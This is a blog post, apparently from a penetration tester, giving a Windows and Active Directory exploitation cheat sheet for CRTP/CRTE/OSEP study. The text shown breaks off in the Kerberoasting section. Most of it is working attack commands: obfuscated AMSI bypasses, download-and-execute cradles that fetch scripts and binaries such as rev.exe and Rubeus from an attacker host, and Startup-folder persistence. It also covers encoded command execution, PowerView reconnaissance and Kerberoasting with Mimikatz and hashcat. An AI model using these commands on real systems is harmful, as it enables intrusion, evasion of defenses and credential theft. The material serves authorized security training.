<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Cas van Cooten]">
<meta name="description" content="Updated March 26th, 2021
This blog post has been updated based on some tools and techniques from Offensive Security&amp;rsquo;s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.
Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation." />
<meta name="keywords" content=", Active Directory, Windows, Hacking" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://casvancooten.com/posts/winadcheatsheet/" />


    <title>
        
            Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference ::  
        
    </title>



<link href="https://casvancooten.com/js/gh-cards.js" rel="script", type="text/javascript">


<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.753fac8f03736f0edc9be411eb20cee875dd7bb8e73c8155fbf6a629c863f4ca.css">






<meta itemprop="name" content="Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference">
<meta itemprop="description" content="Updated March 26th, 2021
This blog post has been updated based on some tools and techniques from Offensive Security&rsquo;s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.
Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation.">
<meta itemprop="datePublished" content="2020-11-04T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-11-04T00:00:00+00:00" />
<meta itemprop="wordCount" content="5010">



<meta itemprop="keywords" content="Active Directory,Windows,Hacking," />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference"/>
<meta name="twitter:description" content="Updated March 26th, 2021
This blog post has been updated based on some tools and techniques from Offensive Security&rsquo;s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.
Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation."/>







    <meta property="article:published_time" content="2020-11-04 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://casvancooten.com/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">hello</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>24 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://casvancooten.com/posts/winadcheatsheet/">Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference</a>
            </h1>
                <hr />
                <aside id="toc">
                <div class="toc-title">Table of Contents</div>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#general">General</a>
      <ul>
        <li><a href="#powershell-amsi-bypass">PowerShell AMSI Bypass</a></li>
        <li><a href="#powershell-one-liners">PowerShell one-liners</a></li>
      </ul>
    </li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#ad-enumeration-with-powerview">AD Enumeration With PowerView</a></li>
        <li><a href="#applocker">AppLocker</a></li>
        <li><a href="#powershell-constrained-language-mode">PowerShell Constrained Language Mode</a></li>
        <li><a href="#laps">LAPS</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#powercat-reverse-shell">Powercat reverse shell</a></li>
      </ul>
    </li>
    <li><a href="#lateral-movement">Lateral Movement</a>
      <ul>
        <li><a href="#lateral-movement-enumeration-with-powerview">Lateral Movement Enumeration With PowerView</a></li>
        <li><a href="#bloodhound">BloodHound</a></li>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
        <li><a href="#as-rep-roasting">AS-REP roasting</a></li>
        <li><a href="#token-manipulation">Token Manipulation</a></li>
        <li><a href="#mimikatz">Mimikatz</a></li>
        <li><a href="#command-execution-with-schtasks">Command execution with schtasks</a></li>
        <li><a href="#command-execution-with-wmi">Command execution with WMI</a></li>
        <li><a href="#command-execution-with-powershell-remoting">Command execution with PowerShell Remoting</a></li>
        <li><a href="#unconstrained-delegation">Unconstrained delegation</a></li>
        <li><a href="#constrained-delegation">Constrained delegation</a></li>
        <li><a href="#resource-based-constrained-delegation">Resource-based constrained delegation</a></li>
        <li><a href="#abusing-domain-trust">Abusing domain trust</a></li>
        <li><a href="#abusing-inter-forest-trust">Abusing inter-forest trust</a></li>
        <li><a href="#abusing-mssql-databases-for-lateral-movement">Abusing MSSQL databases for lateral movement</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#powerup">PowerUp</a></li>
        <li><a href="#uac-bypass">UAC Bypass</a></li>
      </ul>
    </li>
    <li><a href="#persistence">Persistence</a>
      <ul>
        <li><a href="#startup-folder">Startup folder</a></li>
      </ul>
    </li>
    <li><a href="#domain-persistence">Domain Persistence</a>
      <ul>
        <li><a href="#mimikatz-skeleton-key-attack">Mimikatz skeleton key attack</a></li>
        <li><a href="#grant-specific-user-dcsync-rights-with-powerview">Grant specific user DCSync rights with PowerView</a></li>
        <li><a href="#domain-controller-dsrm-admin">Domain Controller DSRM admin</a></li>
        <li><a href="#modifying-security-descriptors-for-remote-wmi-access">Modifying security descriptors for remote WMI access</a></li>
        <li><a href="#modifying-security-descriptors-for-powershell-remoting-access">Modifying security descriptors for PowerShell Remoting access</a></li>
        <li><a href="#modifying-dc-registry-security-descriptors-for-remote-hash-retrieval-using-damp">Modifying DC registry security descriptors for remote hash retrieval using DAMP</a></li>
        <li><a href="#dcshadow">DCShadow</a></li>
      </ul>
    </li>
    <li><a href="#post-exploitation">Post-Exploitation</a>
      <ul>
        <li><a href="#lsass-protection">LSASS protection</a></li>
        <li><a href="#dumping-secrets-with-mimikatz">Dumping secrets with Mimikatz</a></li>
        <li><a href="#dumping-secrets-without-mimikatz">Dumping secrets without Mimikatz</a></li>
        <li><a href="#disable-defender">Disable defender</a></li>
        <li><a href="#chisel-proxying">Chisel proxying</a></li>
        <li><a href="#juicy-files">Juicy files</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </aside>
                <hr />

            

            <div class="post-content">
                <p><em>Updated <strong>March 26th, 2021</strong></em></p>
<p><em>This blog post has been updated based on some tools and techniques from Offensive Security&rsquo;s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.</em></p>
<p>Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation. It is largely aimed at completing these two certifications, but should be useful in a lot of cases when dealing with Windows / AD exploitation.</p>
<p>That being said - it is <em>far from</em> an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch. I will try to keep it updated as much as possible!</p>
<p>Many items of this list are shamelessly stolen from Nikhil Mittal and the CRTP/CRTE curricula, so big thanks to them!
If you are looking for the cheat sheet and command reference I used for OSCP, please refer to <a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/">this post</a>.</p>
<p><em>Note: I tried to highlight some poor OpSec choices for typical red teaming engagements with ðŸš©. I will likely have missed some though, so, understand what you are running before you run it!</em></p>
<h2 id="general">General</h2>
<h3 id="powershell-amsi-bypass">PowerShell AMSI Bypass</h3>
<p>Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged ðŸš©. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts to beat signature-based detection.</p>
<p>&lsquo;Plain&rsquo; AMSI bypass:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[Ref]</span>.Assembly.GetType(<span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span>).GetField(<span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span>).SetValue($null,$true)
</code></pre></div><p>Obfuscation example for copy-paste purposes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sET-ItEM ( <span style="color:#e6db74">&#39;V&#39;</span>+<span style="color:#e6db74">&#39;aR&#39;</span> +  <span style="color:#e6db74">&#39;IA&#39;</span> + <span style="color:#e6db74">&#39;blE:1q2&#39;</span>  + <span style="color:#e6db74">&#39;uZx&#39;</span>  ) ( <span style="color:#66d9ef">[TYpE]</span>(  <span style="color:#e6db74">&#34;{1}{0}&#34;</span><span style="color:#f92672">-F</span><span style="color:#e6db74">&#39;F&#39;</span>,<span style="color:#e6db74">&#39;rE&#39;</span>  ) )  ;    (    GeT-VariaBle  ( <span style="color:#e6db74">&#34;1Q2U&#34;</span>  +<span style="color:#e6db74">&#34;zX&#34;</span>  )  -VaL ).<span style="color:#e6db74">&#34;A`ss`Embly&#34;</span>.<span style="color:#e6db74">&#34;GET</span><span style="color:#ae81ff">`T</span><span style="color:#e6db74">Y`Pe&#34;</span>((  <span style="color:#e6db74">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> <span style="color:#f92672">-f</span><span style="color:#e6db74">&#39;Util&#39;</span>,<span style="color:#e6db74">&#39;A&#39;</span>,<span style="color:#e6db74">&#39;Amsi&#39;</span>,<span style="color:#e6db74">&#39;.Management.&#39;</span>,<span style="color:#e6db74">&#39;utomation.&#39;</span>,<span style="color:#e6db74">&#39;s&#39;</span>,<span style="color:#e6db74">&#39;System&#39;</span>  ) ).<span style="color:#e6db74">&#34;g`etf`iElD&#34;</span>(  ( <span style="color:#e6db74">&#34;{0}{2}{1}&#34;</span> <span style="color:#f92672">-f</span><span style="color:#e6db74">&#39;amsi&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#e6db74">&#39;InitFaile&#39;</span>  ),(  <span style="color:#e6db74">&#34;{2}{4}{0}{1}{3}&#34;</span> <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#39;Stat&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;NonPubli&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;c,&#39;</span> )).<span style="color:#e6db74">&#34;sE</span><span style="color:#ae81ff">`T`V</span><span style="color:#e6db74">aLUE&#34;</span>(  ${n`ULl},${t`RuE} )
</code></pre></div><p>Another bypass, which is not detected by PowerShell autologging:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[Delegate]</span>::CreateDelegate((<span style="color:#e6db74">&#34;Func</span><span style="color:#ae81ff">``</span><span style="color:#e6db74">3[String, </span>$((<span style="color:#66d9ef">[String]</span>.Assembly.GetType(<span style="color:#e6db74">&#39;System.Reflection.Bindin&#39;</span>+<span style="color:#e6db74">&#39;gFlags&#39;</span>)).FullName)<span style="color:#e6db74">, System.Reflection.FieldInfo]&#34;</span> <span style="color:#f92672">-as</span> <span style="color:#66d9ef">[String]</span>.Assembly.GetType(<span style="color:#e6db74">&#39;System.T&#39;</span>+<span style="color:#e6db74">&#39;ype&#39;</span>)), <span style="color:#66d9ef">[Object]</span>(<span style="color:#66d9ef">[Ref]</span>.Assembly.GetType(<span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span>)),(<span style="color:#e6db74">&#39;GetFie&#39;</span>+<span style="color:#e6db74">&#39;ld&#39;</span>)).Invoke(<span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,((<span style="color:#e6db74">&#39;Non&#39;</span>+<span style="color:#e6db74">&#39;Public,Static&#39;</span>) <span style="color:#f92672">-as</span> <span style="color:#66d9ef">[String]</span>.Assembly.GetType(<span style="color:#e6db74">&#39;System.Reflection.Bindin&#39;</span>+<span style="color:#e6db74">&#39;gFlags&#39;</span>))).SetValue($null,$True)
</code></pre></div><blockquote>
<p>More bypasses <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">here</a>. For obfuscation, check <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a>, or get a pre-generated obfuscated version at <a href="https:///amsi.fail">amsi.fail</a>.</p>
</blockquote>
<h3 id="powershell-one-liners">PowerShell one-liners</h3>
<h4 id="load-powershell-script-reflectively">Load PowerShell script reflectively</h4>
<p>Proxy-aware:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">IEX (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.10.16.7/PowerView.obs.ps1&#39;</span>)
</code></pre></div><p>Non-proxy aware:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;http://10.10.16.7/PowerView.obs.ps1&#39;</span>,$false);$h.send();iex $h.responseText
</code></pre></div><blockquote>
<p>Again, this will likely get flagged ðŸš©. For opsec-safe download cradles, check out <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a>.</p>
</blockquote>
<h4 id="load-c-assembly-reflectively">Load C# assembly reflectively</h4>
<p>Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">refer here for details</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Download and run assembly without arguments</span>
$data = (New-Object System.Net.WebClient).DownloadData(<span style="color:#e6db74">&#39;http://10.10.16.7/rev.exe&#39;</span>)
$assem = <span style="color:#66d9ef">[System.Reflection.Assembly]</span>::Load($data)
<span style="color:#66d9ef">[rev.Program]</span>::Main(<span style="color:#e6db74">&#34;&#34;</span>.Split())

<span style="color:#75715e"># Download and run Rubeus, with arguments</span>
$data = (New-Object System.Net.WebClient).DownloadData(<span style="color:#e6db74">&#39;http://10.10.16.7/Rubeus.exe&#39;</span>)
$assem = <span style="color:#66d9ef">[System.Reflection.Assembly]</span>::Load($data)
<span style="color:#66d9ef">[Rubeus.Program]</span>::Main(<span style="color:#e6db74">&#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt&#34;</span>.Split())

<span style="color:#75715e"># Execute a specific method from an assembly (e.g. a DLL)</span>
$data = (New-Object System.Net.WebClient).DownloadData(<span style="color:#e6db74">&#39;http://10.10.16.7/lib.dll&#39;</span>)
$assem = <span style="color:#66d9ef">[System.Reflection.Assembly]</span>::Load($data)
$class = $assem.GetType(<span style="color:#e6db74">&#34;ClassLibrary1.Class1&#34;</span>)
$method = $class.GetMethod(<span style="color:#e6db74">&#34;runner&#34;</span>)
$method.Invoke(0, $null)
</code></pre></div><h4 id="download-file">Download file</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Any version</span>
(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#34;http://192.168.119.155/PowerUp.ps1&#34;</span>, <span style="color:#e6db74">&#34;C:\Windows\Temp\PowerUp.ps1&#34;</span>)

<span style="color:#75715e"># Powershell 4+</span>
<span style="color:#75715e">## You can use &#39;IWR&#39; as a shorthand</span>
Invoke-WebRequest <span style="color:#e6db74">&#34;http://10.10.16.7/Incnspc64.exe&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe&#34;</span>
</code></pre></div><h4 id="encode-command">Encode command</h4>
<p>Encode one-liner:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$command = <span style="color:#e6db74">&#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#34;)&#39;</span>
$bytes = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetBytes($command)
$encodedCommand = <span style="color:#66d9ef">[Convert]</span>::ToBase64String($bytes)
</code></pre></div><p>Or, the Linux version of the above:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#34;)&#39;</span> | iconv -t utf-16le | base64 -w <span style="color:#ae81ff">0</span>
</code></pre></div><p>Encode existing script, copy to clipboard:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Convert]</span>::ToBase64String(<span style="color:#66d9ef">[System.IO.File]</span>::ReadAllBytes(<span style="color:#e6db74">&#39;c:\path\to\PowerView.ps1&#39;</span>)) | clip
</code></pre></div><p>Run it, bypassing execution policy.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Powershell -EncodedCommand $encodedCommand
</code></pre></div><blockquote>
<p>If you have Nishang handy, you can use <a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1">Invoke-Encode.ps1</a>.</p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="ad-enumeration-with-powerview">AD Enumeration With PowerView</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Get all users in the current domain</span>
Get-NetUser | select -ExpandProperty cn

<span style="color:#75715e"># Get all computers in the current domain</span>
Get-NetComputer

<span style="color:#75715e"># Get all domains in current forest</span>
Get-NetForestDomain

<span style="color:#75715e"># Get domain/forest trusts</span>
Get-NetDomainTrust
Get-NetForestTrust

<span style="color:#75715e"># Get information for the DA group</span>
Get-NetGroup -GroupName <span style="color:#e6db74">&#34;Domain Admins&#34;</span>

<span style="color:#75715e"># Find members of the DA group</span>
Get-NetGroupMember -GroupName <span style="color:#e6db74">&#34;Domain Admins&#34;</span> | select -ExpandProperty membername

<span style="color:#75715e"># Find interesting shares in the domain, ignore default shares</span>
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC

<span style="color:#75715e"># Get OUs for current domain</span>
Get-NetOU -FullData

<span style="color:#75715e"># Get computers in an OU</span>
<span style="color:#75715e"># %{} is a looping statement</span>
Get-NetOU -OUName StudentMachines | %{Get-NetComputer -ADSPath $_}

<span style="color:#75715e"># Get GPOs applied to a specific OU</span>
Get-NetOU *student* | select gplink
Get-NetGPO -Name <span style="color:#e6db74">&#34;{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}&#34;</span>

<span style="color:#75715e"># Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain</span>
Get-NetGPOGroup

<span style="color:#75715e"># Get incoming ACL for a specific object</span>
Get-ObjectACL -SamAccountName <span style="color:#e6db74">&#34;Domain Admins&#34;</span> -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

<span style="color:#75715e"># Find interesting ACLs for the entire domain, show in a readable (left-to-right) format</span>
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName <span style="color:#f92672">-NotContains</span> <span style="color:#e6db74">&#34;DnsAdmins&#34;</span>} | ft

<span style="color:#75715e"># Get interesting outgoing ACLs for a specific user or group</span>
<span style="color:#75715e"># ?{} is a filter statement</span>
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;Domain Admins&#34;</span>} | select ObjectDN,ActiveDirectoryRights
</code></pre></div><h3 id="applocker">AppLocker</h3>
<p>Identify AppLocker policy. Look for exempted binaries or paths to bypass.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</code></pre></div><p>Some high-level bypass techniques:</p>
<ul>
<li>Use <a href="https://lolbas-project.github.io/">LOLBAS</a> if only (Microsoft-)signed binaries are allowed.</li>
<li>If binaries from <code>C:\Windows</code> are allowed, try dropping your binaries to <code>C:\Windows\Temp</code> or <code>C:\Windows\Tasks</code>. If there are no writable subdirectories but writable files exist in this directory tree, write your file to an alternate data stream (e.g. a JScript script) and execute it from there.</li>
<li>Wrap your binaries in a DLL file and execute them with <code>rundll32</code> to bypass executable rules. If binaries like Python are allowed, use that. If that doesn&rsquo;t work, try other techniques such as wrapping JScript in a HTA file or running XSL files with <code>wmic</code>.</li>
</ul>
<h3 id="powershell-constrained-language-mode">PowerShell Constrained Language Mode</h3>
<p>Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker (see above).</p>
<p>You can identify you&rsquo;re in constrained language mode by polling the following variable to get the current language mode. It will say <code>FullLanguage</code> for an unrestricted session, and <code>ConstrainedLanguage</code> for CLM. There are other language modes which I will not go into here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ExecutionContext.SessionState.LanguageMode
</code></pre></div><p>The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. <code>whoami</code> is blocked, try the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">&amp;{whoami}
</code></pre></div><h3 id="laps">LAPS</h3>
<p>We can use <a href="https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1">LAPSToolkit.ps1</a> to identify which machines in the domain use LAPS, and which domain groups are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Get computers running LAPS, along with their passwords if we&#39;re allowed to read those</span>
Get-LAPSComputers

<span style="color:#75715e"># Get groups allowed to read LAPS passwords</span>
Find-LAPSDelegatedGroups
</code></pre></div><h2 id="exploitation">Exploitation</h2>
<h3 id="powercat-reverse-shell">Powercat reverse shell</h3>
<p>If a reverse shell to your Linux box is not an option ;).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powercat -l -p 443 -t 9999
</code></pre></div><h2 id="lateral-movement">Lateral Movement</h2>
<h3 id="lateral-movement-enumeration-with-powerview">Lateral Movement Enumeration With PowerView</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Find existing local admin access for user (noisy ðŸš©)</span>
Find-LocalAdminAccess

<span style="color:#75715e"># Find local admin access over PS remoting (also noisy ðŸš©), requires Find-PSRemotingLocalAdminAccess.ps1</span>
Get-NetComputer -Domain dollarcorp.moneycorp.local &gt; .\targets.txt
Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355

<span style="color:#75715e"># Same for WMI. Requires &#39;Find-WMILocalAdminAccess.ps1&#39;, which seems to be removed from Nishang?</span>
Find-WMILocalAdminAccess -ComputerFile .\targets.txt
Find-WMILocalAdminAccess <span style="color:#75715e"># Finds domain computers automatically</span>

<span style="color:#75715e"># Hunt for sessions of interesting users on machines where you have access (still noisy ðŸš©)</span>
Invoke-UserHunter -CheckAccess | ?{$_.LocalAdmin <span style="color:#f92672">-Eq</span> True }

<span style="color:#75715e"># Look for kerberoastable users</span>
Get-DomainUser -SPN | select name,serviceprincipalname

<span style="color:#75715e"># Look for AS-REP roastable users</span>
Get-DomainUser -PreauthNotRequired | select name

<span style="color:#75715e"># Look for users on which we can set UserAccountControl flags</span>
<span style="color:#75715e">## If available - disable preauth or add SPN (see below)</span>
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;RDPUsers&#34;</span>}

<span style="color:#75715e"># Look for servers with Unconstrained Delegation enabled</span>
<span style="color:#75715e">## If available and you have admin privs on this server, get user TGT (see below)</span>
Get-DomainComputer -Unconstrained

<span style="color:#75715e"># Look for users or computers with Constrained Delegation enabled</span>
<span style="color:#75715e">## If available and you have user/computer hash, access service machine as DA (see below)</span>
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
</code></pre></div><h3 id="bloodhound">BloodHound</h3>
<p>Use <code>Invoke-BloodHound</code> from <code>SharpHound.ps1</code>, or use <code>SharpHound.exe</code>. Both can be ran reflectively, get them <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">here</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Run all checks if you don&#39;t care about OpSec ðŸš©</span>
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

<span style="color:#75715e"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts ðŸš©</span>
Invoke-BloodHound -CollectionMethod LoggedOn
</code></pre></div><h3 id="kerberoasting">Kerberoasting</h3>
<h4 id="automatic">Automatic</h4>
<p>With PowerView:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Request-SPNTicket -SPN <span style="color:#e6db74">&#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&#34;</span>
</code></pre></div><p>Crack the hash with Hashcat:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> hash.txt <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/rockyou.txt --rules-file <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/hashcat/rules/best64.rule
</code></pre></div><h4 id="manual">Manual</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Request TGS for kerberoastable account (SPN)</span>
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span style="color:#e6db74">&#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&#34;</span>

<span style="color:#75715e"># Dump TGS to disk</span>
Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;kerberos::list /export&#34;&#39;</span>

<span style="color:#75715e"># Crack with TGSRepCrack</span>
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
</code></pre></div><h4 id="targeted-kerberoasting-by-setting-spn">Targeted kerberoasting by setting SPN</h4>
<p>We need ACL write permissions to set UserAccountControl flags for said user, see above for hunting. Using PowerView:</p>
